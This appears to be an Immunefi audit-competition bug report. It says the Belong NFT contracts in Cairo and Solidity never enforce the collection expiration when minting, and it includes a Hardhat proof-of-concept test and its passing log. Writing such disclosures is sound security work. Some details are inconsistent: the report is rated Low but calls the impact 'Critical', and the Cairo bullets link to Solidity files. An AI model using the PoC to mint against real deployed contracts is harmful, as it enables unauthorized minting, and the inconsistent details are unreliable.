# 57505 sc low missing collection expiration enforcement allows unauthorized minting&#x20;

**Submitted on Oct 26th 2025 at 20:04:28 UTC by @Rhaydden for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57505
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nft/nft.cairohttps://github.com/immunefi-team/audit-comp-belong/blob/feat/cairo/src/nft/nft.cairo>
* **Impacts:**
  * Unauthorized minting of NFTs

## Description

### Issue description

Both implementations (Cairo and Solidity v1/v2) store a collection-level expiration timestamp but never enforce it during minting.

* Cairo:

  * The collection expiration is stored but not used. It's defined here: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nft/interface.cairo#L14-L15>

  ```cairo
      pub collection_expires: u256, // Collection expiration period (timestamp)
  ```

  * It's set on deploy here: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/src/nftfactory/nftfactory.cairo#L304>

  ```cairo
      collection_expires: info.collection_expires,
  ```

  * It is not validated in minting in the following parts of the protocol:
    * src/nft/nft.cairo: \_mint\_dynamic\_price\_batch <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v1/NFT.sol#L152-L181>
    * src/nft/nft.cairo: \_mint\_static\_price\_batch <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v1/NFT.sol#L191-L214>
    * src/nft/nft.cairo: \_base\_mint (here it only checks max\_total\_supply) <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v1/NFT.sol#L287-L297>
* Solidity v1:

  * Defined in contracts/v1/Structures.sol: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v1/Structures.sol#L33>

  ```solidity
      uint256 collectionExpire;
  ```

  * Not validated in minting:
    * contracts/v1/NFT.sol mintStaticPrice L152–181
    * contracts/v1/NFT.sol mintDynamicPrice L191–214
    * contracts/v1/NFT.sol \_baseMint L287–297 (only supply cap)
  * No use of `block.timestamp` in those mint flows.
* Solidity v2 (AccessToken):

  * Defined in contracts/v2/Structures.sol: <https://github.com/immunefi-team/audit-comp-belong//blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/Structures.sol#L32-L33>

  ```solidity
      uint256 collectionExpire;
  ```

  * Not validated in minting:
    * contracts/v2/tokens/AccessToken.sol mintStaticPrice L173-L199
    * contracts/v2/tokens/AccessToken.sol mintDynamicPrice L209-L230
    * contracts/v2/tokens/AccessToken.sol \_baseMint L302-L310 (only supply cap)

Because of the missing on-chain check, collections intended to be time-bound can be minted indefinitely after the intended expiration.

## Impact

Critical - Unauthorized minting of NFTs\
The protocol intends to prevent mints after a deadline but does not enforce it on chain, allowing mints that should be disallowed.

## Recommended mitigation steps

{% hint style="info" %}
Enforce collection expiration at mint-time. Treat `0` as “no expiry”.
{% endhint %}

* Cairo:
  * In `_base_mint` or the relevant mint entrypoints, revert if `collection_expires != 0` and `now > collection_expires`.
* Solidity v1/v2:

  * Prefer centralizing the check in `_baseMint`:

  ```solidity
  require(collectionExpire == 0 || block.timestamp <= collectionExpire, CollectionExpired());
  ```

## Proof of Concept

<details>

<summary>PoC: Hardhat test demonstrating mint after expiry (v1)</summary>

I added a focused Hardhat test that deploys a v1 NFT with `collectionExpire` in the past and mints successfully.

Create a file named `test/v1/nft_expiry_poc.test.ts` and paste the PoC below in it. The test deploys v1 `NFT` with `collectionExpire = 1` (past), then mints via `mintStaticPrice`. The mint succeeds and `ownerOf(0)` equals the minter.

```ts
import { ethers, upgrades } from 'hardhat';
import { expect } from 'chai';
import EthCrypto from 'eth-crypto';
import { ContractFactory, BigNumber } from 'ethers';
import {
  WETHMock,
  MockTransferValidator,
  NFTFactory as NFTFactoryV1,
  NFT as NFTV1,
  RoyaltiesReceiver,
} from '../../typechain-types';
import { NftFactoryParametersStruct } from '../../typechain-types/contracts/v1/factories/NFTFactory';
import { InstanceInfoStruct, StaticPriceParametersStruct } from '../../typechain-types/contracts/v1/NFT';

// PoC: collectionExpire is not enforced in v1 NFT minting
// This test deploys an NFT with collectionExpire in the past and demonstrates mint succeeds.

describe('PoC: Missing Collection Expiration Validation (v1)', () => {
  const PLATFORM_COMMISSION = '100';
  const ETH_ADDRESS = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
  const chainId = 31337;

  const nftName = 'PoCName';
  const nftSymbol = 'POC';
  const contractURI = 'ipfs://poc';
  const ethPrice = ethers.utils.parseEther('0.01');

  async function deployFixture() {
    const [owner, alice, bob] = await ethers.getSigners();
    const signer = EthCrypto.createIdentity();

    const Validator: ContractFactory = await ethers.getContractFactory('MockTransferValidator');
    const validator: MockTransferValidator = (await Validator.deploy(true)) as MockTransferValidator;
    await validator.deployed();

    const Erc20Example: ContractFactory = await ethers.getContractFactory('WETHMock');
    const erc20Example: WETHMock = (await Erc20Example.deploy()) as WETHMock;
    await erc20Example.deployed();

    const nftInfo: NftFactoryParametersStruct = {
      platformAddress: owner.address,
      signerAddress: signer.address,
      defaultPaymentCurrency: ETH_ADDRESS,
      platformCommission: PLATFORM_COMMISSION,
      maxArraySize: 10,
      transferValidator: validator.address,
    } as unknown as NftFactoryParametersStruct;

    const referralPercentages = [0, 5000, 3000, 1500, 500];

    const NFTFactory: ContractFactory = await ethers.getContractFactory('NFTFactory');
    const factory: NFTFactoryV1 = (await upgrades.deployProxy(NFTFactory, [nftInfo, referralPercentages], {
      unsafeAllow: ['constructor'],
    })) as NFTFactoryV1;
    await factory.deployed();

    // Create referral code for bob (mirrors existing tests)
    await factory.connect(bob).createReferralCode();
    const hashedCode = EthCrypto.hash.keccak256([
      { type: 'address', value: bob.address },
      { type: 'address', value: factory.address },
      { type: 'uint256', value: chainId },
    ]);

    // Sign produce payload
    const produceMsg = EthCrypto.hash.keccak256([
      { type: 'string', value: nftName },
      { type: 'string', value: nftSymbol },
      { type: 'string', value: contractURI },
      { type: 'uint96', value: 600 },
      { type: 'uint256', value: chainId },
    ]);
    const signature = EthCrypto.sign(signer.privateKey, produceMsg);

    // Intentionally set collectionExpire in the past (1)
    const instanceInfoETH: InstanceInfoStruct = {
      metadata: { name: nftName, symbol: nftSymbol },
      contractURI,
      payingToken: ETH_ADDRESS,
      mintPrice: ethPrice,
      whitelistMintPrice: ethPrice,
      transferable: true,
      maxTotalSupply: 5,
      feeNumerator: BigNumber.from('600'),
      collectionExpire: BigNumber.from('1'),
      signature,
    } as unknown as InstanceInfoStruct;

    await factory.connect(alice).produce(instanceInfoETH, hashedCode);

    const nft: NFTV1 = (await ethers.getContractAt(
      'NFT',
      (
        await factory.getNftInstanceInfo(ethers.utils.solidityKeccak256(['string', 'string'], [nftName, nftSymbol]))
      ).nftAddress,
    )) as unknown as NFTV1;

    return { owner, alice, bob, signer, factory, nft };
  }

  it('allows minting after collectionExpire has passed', async () => {
    const { nft, alice, signer } = await deployFixture();

    const BASE_URI = 'poc.com/';

    const msg = EthCrypto.hash.keccak256([
      { type: 'address', value: alice.address },
      { type: 'uint256', value: 0 },
      { type: 'string', value: BASE_URI },
      { type: 'bool', value: false },
      { type: 'uint256', value: chainId },
    ]);
    const sig = EthCrypto.sign(signer.privateKey, msg);

    await nft.connect(alice).mintStaticPrice(
      alice.address,
      [
        {
          tokenId: 0,
          tokenUri: BASE_URI,
          whitelisted: false,
          signature: sig,
        } as StaticPriceParametersStruct,
      ],
      ETH_ADDRESS,
      ethPrice,
      { value: ethPrice },
    );

    // If expiration were enforced, this call would revert. It succeeds and token 0 exists.
    expect(await nft.ownerOf(0)).to.equal(alice.address);
  });
});
```

Run test with:

```bash
LEDGER_ADDRESS=0x0000000000000000000000000000000000000001 \
PK=0x59c6995e998f97a5a0044976f094538e7df3b9cc8f2c9f7eca38c1d10b2fd48d \
ENABLE_FORK=0 \
npx hardhat test test/v1/nft_expiry_poc.test.ts
```

**Logs**

```
PoC: Missing Collection Expiration Validation (v1)
  ✔ allows minting after collectionExpire has passed (279ms)

1 passing (442ms)
```

</details>
